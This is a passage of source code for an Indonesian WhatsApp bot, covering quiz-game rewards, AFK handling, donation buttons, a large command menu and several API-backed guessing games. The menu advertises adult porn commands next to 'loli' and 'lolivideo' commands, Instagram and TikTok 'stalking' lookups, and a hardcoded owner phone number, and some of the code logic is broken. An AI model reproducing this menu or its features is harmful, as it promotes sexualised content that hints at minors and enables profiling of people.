                            await reply(`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)
                            delete asahotak[sender.split('@')[0]]
                            fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                     }
              }
              if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = caklontong[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htgmi = randomNomor(100)
                            atm.addKoinUser(sender, htgmi, _uang)
                            await reply(`*_🎮 Caklontong  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)
                            delete caklontong[sender.split('@')[0]]
                            fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                     }
              }
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebakjenaka[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htgmuu = randomNomor(100)
                            atm.addKoinUser(sender, htgmuu, _uang)
                            await reply(`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)
                            delete tebakjenaka[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
                     }
              }
              if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebaklirik[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htgmii = randomNomor(100)
                            atm.addKoinUser(sender, htgmii, _uang)
                            await reply(`*_🎮 Tebak Lirik 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`)
                            delete tebaklirik[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
                     }
              }
              if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebakimia[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htgmcc = randomNomor(100)
                            atm.addKoinUser(sender, htgmcc, _uang)
                            await reply(`*_🎮 Tebak Kimia 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)
                            delete tebakimia[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
                     }
              }
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebaksiapaaku[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htgmk = randomNomor(100)
                            atm.addKoinUser(sender, htgmk, _uang)
                            await reply(`*_🎮 Tebak Siapakah Aku  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`)
                            delete tebaksiapaaku[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                     }
              }
              if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebakbendera[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var html = randomNomor(100)
                            atm.addKoinUser(sender, html, _uang)
                            await reply(`*_🎮 Tebak Bendera  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`)
                            delete tebakbendera[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                     }
              }
              if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = susunkata[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htmp = randomNomor(100)
                            atm.addKoinUser(sender, htmp, _uang)
                            await reply(`*_🎮 Susun Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`)
                            delete susunkata[sender.split('@')[0]]
                            fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
                     }
              }
              if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebakata[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htmu = randomNomor(100)
                            atm.addKoinUser(sender, htmu, _uang)
                            await reply(`*_🎮 Tebak Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`)
                            delete tebakata[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
                     }
              }
              // AFK
              if (isGroup) {
                     if (!mek.key.fromMe && mek.key.fromMe) return
                     for (let x of mentionUser) {
                            if (afk.checkAfkUser(x, _afk)) {
                                   const getId = afk.getAfkId(x, _afk)
                                   const getReason = afk.getAfkReason(getId, _afk)
                                   const getTime = afk.getAfkTime(getId, _afk)
                                   const cptl = `*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan diganggu!*
➸ *Alasan*  : ${getReason}
➸ *Sejak* : ${getTime}`
                                   mentions(cptl, x, true)
                            }
                     }
                     if (afk.checkAfkUser(sender, _afk) && !isCmd) {
                            const getTime = afk.getAfkTime(sender, _afk)
                            const getReason = afk.getAfkReason(sender, _afk)
                            const ittung = ms(await Date.now() - getTime)
                            const pep = `*${pushname}* telah kembali dari AFK! Selamat datang kembali~`
                            reply(pep)
                            _afk.splice(afk.getAfkPosition(sender, _afk), 1)
                            fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))
                     }
              }

              // Auto Read
              dha.chatRead(from, "read")
              //auto vn 
              await dha.updatePresence(from, Presence.recording)

              // CMD
              if (isCmd && !isGroup)
                     atm.addKoinUser(sender, randomNomor(20), _uang)
              console.log(color('[ PRIV ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))

              if (isCmd && isGroup)
                     atm.addKoinUser(sender, randomNomor(20), _uang)
              console.log(color('[ GC ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))


              switch (command) {

                     case 'donasi':
                            txtt = `Hai Kak.....\n*${pushname}*\nMAU DONASI PILIH SALAH SATU`

                            buttons = [{
                                   buttonId: '!dana',
                                   buttonText: {
                                          displayText: 'DANA'
                                   },
                                   type: 1
                            }, {
                                   buttonId: '!gopay',
                                   buttonText: {
                                          displayText: 'GOPAY'
                                   },
                                   type: 1
                            }, {
                                   buttonId: '!pulsa',
                                   buttonText: {
                                          displayText: 'PULSA'
                                   },
                                   type: 1
                            }]

                            buttonsMessage = {
                                   contentText: `${txtt}`,
                                   footerText: 'DONASI MU SANGAT BERHARGA BAGI KAMI',
                                   buttons: buttons,
                                   headerType: 1
                            }

                            prep = await dha.prepareMessageFromContent(from, {
                                   buttonsMessage
                            }, {})
                            dha.relayWAMessage(prep)
                            break
                     case 'owner':
                     case 'creator':
                            sendKontak(from, `${owner}`, `${ownerName}`, 'Sibukk!!')
                            await sleep(1000)
                            txtt = `Hai Kak..... ${pushname}\nItu Ownerku, Mau tau soal apa ya?`

                            buttons = [{
                                   buttonId: '!youtube',
                                   buttonText: {
                                          displayText: 'YOUTUBE'
                                   },
                                   type: 1
                            }, {
                                   buttonId: '!infoig',
                                   buttonText: {
                                          displayText: 'INSTAGRAM'
                                   },
                                   type: 1
                            }]

                            buttonsMessage = {
                                   contentText: `${txtt}`,
                                   footerText: 'Jangan Sungkan Chat Ya Kak',
                                   buttons: buttons,
                                   headerType: 1
                            }

                            prep = await dha.prepareMessageFromContent(from, {
                                   buttonsMessage
                            }, {})
                            dha.relayWAMessage(prep)
                            break
                            const sendButImage = async (id, text1, desc1, gam1, but = [], options = {}) => {
                                   kma = gam1
                                   mhan = await dha.prepareMessage(from, kma, image)
                                   const buttonMessages = {
                                          imageMessage: mhan.message.imageMessage,
                                          contentText: text1,
                                          footerText: desc1,
                                          buttons: but,
                                          headerType: 4
                                   }
                                   dha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
                            }

                     case 'menu':
                     case 'help':
                            menu = `Hai Kak.....\n*${pushname}*\n\`\`\`Saya NOIR,SENANG BISA BERTEMU DENGANMU HARI INI\`\`\`
        
𝗜𝗡𝗙𝗢 𝗣𝗘𝗡𝗚𝗚𝗨𝗡𝗔 𝗕𝗢𝗧
❏ NAMA : *${pushname}*
❏ API : *@${sender.split('@')[0]}*
❏ STATUS : *${isOwner ? 'OWNER' : isPremium ? 'Premium' : 'Gratisan'}*
❏ LIMIT : *${isPremium ? 'Unlimited' : `${gcount}`}*

𝗜𝗡𝗙𝗢 𝗕𝗢𝗧
❏ NAMA : *NOIR BOT*
❏ API : @6285155064115
❏ OWNER : *@hzkyx*
❏ API : *@6285155064115*
❏ AKTIF : *${runtime(process.uptime())}*
❏ BATERAI : *${baterai}%*
❏ PREFIX : *『${prefix}』*

   ━━━━━ 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨 ━━━━━

𝖨𝖭𝖥𝖮 𝖬𝖤𝖭𝖴
*▢ ${prefix}update*
*▢ ${prefix}iklan*
*▢ ${prefix}level*
*▢ ${prefix}rules*
*▢ ${prefix}profile*
*▢ ${prefix}waktu*
*▢ ${prefix}botstat*
*▢ ${prefix}sewabot*
*▢ ${prefix}listsewa*
*▢ ${prefix}owner*
*▢ ${prefix}ping*
*▢ ${prefix}runtime*
*▢ ${prefix}donasi*
*▢ ${prefix}leaderboard*
*▢ ${prefix}cekpremium*
*▢ ${prefix}listpremium*
*▢ ${prefix}bugreport* [ keluhan ]

𝖦𝖱𝖴𝖯 𝖬𝖤𝖭𝖴
*▢ ${prefix}groupsetting*
*▢ ${prefix}getbio* _reply_
*▢ ${prefix}afk* _alasan_
*▢ ${prefix}kontak* _nomor|nama_
*▢ ${prefix}ceksewa*
*▢ ${prefix}kickall*
*▢ ${prefix}infogrup*
*▢ ${prefix}promote*
*▢ ${prefix}promoteall*
*▢ ${prefix}demote*
*▢ ${prefix}demoteall*
*▢ ${prefix}listonline*
*▢ ${prefix}tagall* _teks_
*▢ ${prefix}leave*
*▢ ${prefix}kick* _reply_
*▢ ${prefix}add* _628xxx_
*▢ ${prefix}setnamegc*
*▢ ${prefix}setppgc*
*▢ ${prefix}getpp*
*▢ ${prefix}setdeskgc*
*▢ ${prefix}sider* _reply chat bot_
*▢ ${prefix}hidetag* _teks/reply teks_
*▢ ${prefix}linkgc*
*▢ ${prefix}getdeskgc*

𝖦𝖠𝖬𝖤 𝖬𝖤𝖭𝖴 
*▢ ${prefix}limitgame*
*▢ ${prefix}slot*
*▢ ${prefix}gelud* _@tag_
*▢ ${prefix}tictactoe* _@tag_
*▢ ${prefix}siapaaku*
*▢ ${prefix}family100*
*▢ ${prefix}kuismath*
*▢ ${prefix}asahotak*
*▢ ${prefix}tebaklirik*
*▢ ${prefix}tebaklagu*
*▢ ${prefix}tebakkata*
*▢ ${prefix}susunkata*
*▢ ${prefix}kimiakuis*
*▢ ${prefix}caklontong*
*▢ ${prefix}tebakjenaka*
*▢ ${prefix}tebakanime*
*▢ ${prefix}tebaktebakan*
*▢ ${prefix}tebakgambar*
*▢ ${prefix}tebakumur*
*▢ ${prefix}tebakbendera*
*▢ ${prefix}suit* _batu/kertas/gunting_

𝖣𝖮𝖶𝖭𝖫𝖮𝖠𝖣 𝖬𝖤𝖭𝖴 
*▢ ${prefix}fbdl*
*▢ ${prefix}igdl*
*▢ ${prefix}igdl2*
*▢ ${prefix}twitter*
*▢ ${prefix}tiktok*
*▢ ${prefix}play*
*▢ ${prefix}ythd*
*▢ ${prefix}ytmp3*
*▢ ${prefix}ytmp4*
*▢ ${prefix}soundcloud*
*▢ ${prefix}tiktoknowm*
*▢ ${prefix}tiktokaudio*
*▢ ${prefix}mediafire*
*▢ ${prefix}nhentaipdf* _code_

𝖬𝖠𝖪𝖤𝖱 𝖬𝖤𝖭𝖴 
*▢ ${prefix}tahta* _teks_
*▢ ${prefix}cup* _teks_
*▢ ${prefix}cup1* _teks_
*▢ ${prefix}coffe* _teks_
Makernya banyak tu kalian masukan aja namanya sendiri

𝖲𝖤𝖱𝖳𝖨𝖥𝖨𝖪𝖠𝖳 𝖬𝖤𝖭𝖴
*▢ ${prefix}sertitolol* _teks_

𝖲𝖳𝖨𝖪𝖤𝖱 𝖬𝖤𝖭𝖴 
*▢ ${prefix}attp* _teks_
*▢ ${prefix}ttp* _teks_
*▢ ${prefix}dadu*
*▢ ${prefix}doge*
*▢ ${prefix}patrick*
*▢ ${prefix}gura*
*▢ ${prefix}stickeranime*
*▢ ${prefix}semoji* _emoji_
*▢ ${prefix}sticker* _reply foto/video_
*▢ ${prefix}smeme* _teks|teks_
*▢️ ${prefix}swm* _pack|author_
*▢️ ${prefix}take* _pack|author_

𝖳𝖮𝖮𝖫𝖲 𝖬𝖤𝖭𝖴 
*▢ ${prefix}toimg*
*▢ ${prefix}tovideo*
*▢ ${prefix}tomp3*

𝖣𝖤𝖶𝖠𝖲𝖠 𝖬𝖤𝖭𝖴 
*▢ ${prefix}xnxx* _link_
*▢ ${prefix}xnxxsearch*
*▢ ${prefix}asupan*

𝖯𝖤𝖭𝖣𝖨𝖣𝖨𝖪𝖠𝖭 𝖬𝖤𝖭𝖴 
*▢ ${prefix}nulis*
*▢ ${prefix}wiki*
*▢ ${prefix}brainly*

𝖲𝖳𝖠𝖫𝖪𝖨𝖭𝖦 𝖬𝖤𝖭𝖴 
*▢ ${prefix}igstalk*
*▢ ${prefix}igstalk*
*▢ ${prefix}tiktokstalk*
*▢ ${prefix}githubstalk*

𝖠𝖣𝖣 𝖬𝖤𝖭𝖴 
*▢ ${prefix}addvn*
*▢ ${prefix}listvn*
*▢ ${prefix}getvn*
*▢ ${prefix}addimg*
*▢ ${prefix}listimg*
*▢ ${prefix}getimg*
*▢ ${prefix}addvid*
*▢ ${prefix}listvid*
*▢ ${prefix}getvid*
*▢ ${prefix}addstik*
*▢ ${prefix}liststik*
*▢ ${prefix}getstik*
*▢ ${prefix}addcmd*
*▢ ${prefix}listcmd*
*▢ ${prefix}delcmd*

𝖶𝖨𝖡𝖴 𝖬𝖤𝖭𝖴 
*▢ ${prefix}loli*
*▢ ${prefix}manga*
*▢ ${prefix}anime*
*▢️ ${prefix}lolivideo*
*▢ ${prefix}husbu*
*▢️ ${prefix}waifu*
*▢️ ${prefix}milf*
*▢ ${prefix}neko*
*▢️ ${prefix}kanna*
*▢ ${prefix}sagiri*
*▢ ${prefix}hentai*
*▢ ${prefix}cosplay*
*▢️ ${prefix}wallnime*
*▢️ ${prefix}kusonime*
*▢️ ${prefix}megumin*
*▢ ${prefix}otakudesu*
*▢️ ${prefix}doujindesu*
*▢️ ${prefix}storyanime*
*▢️ ${prefix}otakuongoing*
*▢ ${prefix}nhentai *code*
*▢️ ${prefix}nekopoi _link_
*▢️ ${prefix}nekopoi3d*
*▢️ ${prefix}nekopoicosplay*
*▢ ${prefix}nekopoisearch*

𝖮𝖳𝖧𝖤𝖱 𝖬𝖤𝖭𝖴 
*▢ ${prefix}tourl*
*▢ ${prefix}tinyurl*
*▢ ${prefix}bilamgangka*
*▢ ${prefix}artimimpi*
*▢ ${prefix}resepmasakan*


𝖮𝖶𝖭𝖤𝖱 𝖬𝖤𝖭𝖴 
*▢️ ${prefix}bc* _teks_
*▢ ${prefix}tobc* _audio_
*▢ ${prefix}term*
*▢ ${prefix}eval*
*▢ ${prefix}clearall*
*▢ ${prefix}leaveall*
*▢ ${prefix}join* _teks_
*▢️ ${prefix}shutdown*
*▢ ${prefix}getquoted*
*▢ ${prefix}addupdate* _fiturnya_
*▢️ ${prefix}exif* _nama|author_
*▢ ${prefix}sewa add/del* _waktunya_
*▢️ ${prefix}premium add* _@tag|nomor_
*▢ ${prefix}premium del* _@tag|nomor_
*▢ ${prefix}setpp*
*▢ ${prefix}setbio*
*▢ ${prefix}setname*
*▢ ${prefix}getpp*
*▢ ${prefix}sharelock*
*▢ ${prefix}chat* _nomor|teks_

𝖲𝖤𝖠𝖱𝖢𝖧𝖨𝖭𝖦 𝖬𝖤𝖭𝖴
*▢ ${prefix}nekopoisearch* _query_
*▢ ${prefix}ytsearch* _query_
*▢ ${prefix}shopee* _product_
*▢ ${prefix}playstore* _query_
*▢ ${prefix}ssweb* _query_
*▢ ${prefix}google* _query_
*▢ ${prefix}image* _query_
*▢ ${prefix}pinterest* _query_

𝖥𝖴𝖭 𝖬𝖤𝖭𝖴 
*▢ ${prefix}mining*
*▢ ${prefix}cekwatak*
*▢ ${prefix}cekmati* _nama_
*▢ ${prefix}wangy* _nama_
*▢ ${prefix}citacita*
*▢ ${prefix}toxic*
*▢ ${prefix}truth*
*▢ ${prefix}dare*
*▢ ${prefix}apakah*
*▢ ${prefix}bisakah*
*▢ ${prefix}kapankah*
*▢ ${prefix}rate*
*▢ ${prefix}jadian*
*▢ ${prefix}cantik*
*▢ ${prefix}ganteng*
*▢ ${prefix}beban*
*▢ ${prefix}babi*
*▢ ${prefix}cekganteng*
*▢ ${prefix}cekcantik*
©𝑪𝒓𝒆𝒂𝒕𝒐𝒓 @hzkyx`
                            buttons = [{
                                   buttonId: `${prefix}command`,
                                   buttonText: {
                                          displayText: '𝗔𝗟𝗟 𝗠𝗘𝗡𝗨'
                                   },
                                   type: 1
                            }, {
                                   buttonId: `${prefix}rules`,
                                   buttonText: {
                                          displayText: '𝗥𝗨𝗟𝗘𝗦'
                                   },
                                   type: 1
                            }, {
                                   buttonId: `${prefix}store`,
                                   buttonText: {
                                          displayText: 'TOP UP'
                                   },
                                   type: 1
                            }]

                            imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
                                   thumbnail: fs.readFileSync(`./media/diablo.png`)
                            })).imageMessage

                            buttonsMessage = {
                                   contentText: `${menu}`,
                                   footerText: '\`\`\`NOIR BOT © 2k21 BY @hzkyx\`\`\`',
                                   imageMessage: imageMsg,
                                   buttons: buttons,
                                   headerType: 4
                            }

                            prep = await dha.prepareMessageFromContent(from, {
                                   buttonsMessage
                            }, {
                                   quoted: troli
                            })
                            dha.relayWAMessage(prep)
                            break
                     case 'command':
                            list = []
                            listmenu = [`groupmenu`, `wibumenu`, `stickermenu`, `sertimenu`, `ceritamenu`, `makermenu`, `dewasamenu`, `ownermenu`, `gamemenu`, `funmenu`, `downloadmenu`, `infomenu`, `othermenu`, `toolsmenu`]
                            listmenuu = [`Menu Group`, `Wibu Menu`, `Sticker Menu`, `Islam Menu`, `Serti Menu`, `Cerita Menu`, `Maker Menu`, `Dewasa Menu`, `Owner Menu`, `Game Menu`, `Fun Menu`, `Downloader`, `Info Menu`, `MenuLainnya`, `Tools Menu`]
                            nombor = 1
                            startnum = 0
                            for (let x of listmenu) {
                                   const yy = {
                                          title: 'silahkan pilih menunya ' + nombor++,
                                          rows: [{
                                                 title: `${listmenuu[startnum++]}`,
                                                 description: ``,
                                                 rowId: `${prefix}${x}`
                                          }]
                                   }
                                   list.push(yy)
                            }
                            listmsg(from, `${ucapanWaktu}`, `Hai kak......\n*${pushname}*\nPilih Disini`, list)
                            break
                     case 'store':
                            list = []
                            listmenu = [`dmff`, `dmml`, `ucpubg`, `cpcod`, `cashpb`, `catcoin`, `candysausage`]
                            listmenuu = [`Diamond Free Fire`, `Diamond Mobile Legends`, `Uc PUBG`, `Cp Call Of Dutty`, `Cash Poin Blank`, `Cat Coin Ragnarok`, `Candy Sausage`]
                            nombor = 1
                            startnum = 0
                            for (let x of listmenu) {
                                   const yy = {
                                          title: 'List Harga' + nombor++,
                                          rows: [{
                                                 title: `${listmenuu[startnum++]}`,
                                                 description: `\n\n\n\n\`\`\`Jangan Lupa Di Order Kak\`\`\``,
                                                 rowId: `${prefix}${x}`
                                          }]
                                   }
                                   list.push(yy)
                            }
                            listmsg(from, `${ucapanWaktu}`, `Hai kak.....\n*${pushname}*\nMau Top Up game apa kak pilih saja Disini`, list)
                            break
                            //------------------< Game >------------------- 
                     case 'limitgame':
                     case 'balance':
                            const balance = atm.checkATMuser(sender, _uang)
                            if (isPremium) return reply(`Limit Game : Unlimited\nBalance : Rp.${balance}`)
                            textImg(`Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : Rp.${balance}`)
                            break
                     case 'gelud':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (!isGroup) return reply(mess.only.group)
                            if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
                            if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
                            if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
                            if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)

                            gelutSkuy = setGelud(`${from}`)
                            gelutSkuy.status = false
                            gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
                            gelutSkuy.Y = args[0].replace("@", "");
                            fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
                            starGame = `👑 Memulai Game Baku Hantam 👊🏻

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

                            dha.sendMessage(from, starGame, text, {
                                   quoted: mek,
                                   contextInfo: {
                                          mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],
                                   }
                            })
                            gameAdd(sender, glimit)
                            break
                     case 'delsesigelud':
                            if (!isGroup) return reply(mess.only.group)
                            if (fs.existsSync('./media/' + from + '.json')) {
                                   fs.unlinkSync('./media/' + from + '.json')
                                   reply('Berhasil Menghapus Sesi Gelud')
                            } else {
                                   reply('Tidak ada sesi yang berlangsung')
                            }
                            break
                     case 'delsesittt':
                     case 'resetgame':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
                            naa = ky_ttt.filter(toek => !toek.id.includes(from))
                            ky_ttt = naa
                            reply('Sukses Mereset Game')
                            break
                     case 'tictactoe':
                     case 'ttt':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (!isGroup) return reply(mess.only.group)
                            if (args.length < 1) return reply('Tag Lawan Anda! ')
                            if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
                            if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
                            ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
                            player1 = sender
                            player2 = ment[0]
                            angka = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                            id = from
                            gilir = player2
                            ky_ttt.push({
                                   player1,
                                   player2,
                                   id,
                                   angka,
                                   gilir
                            })
                            dha.sendMessage(from,
                                   `*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                                          contextInfo: {
                                                 mentionedJid: [player2]
                                          }
                                   })
                            gameAdd(sender, glimit)
                            break
                     case 'family100':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
                            anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${setting.lolkey}`)
                            reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.aswer.length}\n\nWaktu : ${gamewaktu}s`)
                            let anoh = anu.data.result.aswer
                            let rgfds = []
                            for (let i of anoh) {
                                   let fefs = i.split('/') ? i.split('/')[0] : i
                                   let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ', '') : fefs
                                   let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
                                   rgfds.push(axsf.toLowerCase())
                            }
                            game.addfam(from, rgfds, gamewaktu, family100)
                            gameAdd(sender, glimit)
                            break
                     case 'tebakanime':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebakchara?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            ini_image = get_result.image
                            jawaban = get_result.name
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            ini_buffer = await getBuffer(ini_image)
                            dha.sendMessage(from, ini_buffer, image, {
                                   quoted: mek,
                                   caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :' + kisi_kisi + '\n• *Waktu* : 30s'
                            }).then(() => {
                                   tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                            })
                            await sleep(30000)
                            if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("*Jawaban*: " + jawaban)
                                   delete tebakanime[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'tebaklagu':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebaklagu.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                            get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=${setting.xteamkey}&id=4mFuArYRh3SO8jfffYLSER`)
                            get_result = get_result.result
                            ini_audio = get_result.preview
                            jawaban = get_result.judul
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            ini_buffer = await getBuffer(ini_audio)
                            reply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :' + kisi_kisi + '\n• *Waktu* : 30s')
                            dha.sendMessage(from, ini_buffer, audio, {
                                   quoted: mek
                            }).then(() => {
                                   tebaklagu[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
                            })
                            await sleep(30000)
                            if (tebaklagu.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("*Jawaban*: " + jawaban)
                                   delete tebaklagu[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'tebaktebakan':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${setting.xteamkey}`)
                            get_result = get_result.result
                            jawaban = get_result.jawaban
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            pertanyaan = get_result.soal
                            dha.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                   quoted: mek
                            }).then(() => {
                                   tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
                            })
                            await sleep(30000)
                            if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete tebaktebakan[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'kuismath':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (kuismath.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                            get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/kuis/math`)
                            ini_image = get_result.soal
                            jawaban = get_result.jawaban
                            ini_buffer = await getBuffer(ini_image)
                            dha.sendMessage(from, ini_buffer, image, {
                                   quoted: mek,
                                   caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s'
                            }).then(() => {
                                   kuismath[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
                            })
                            await sleep(50000)
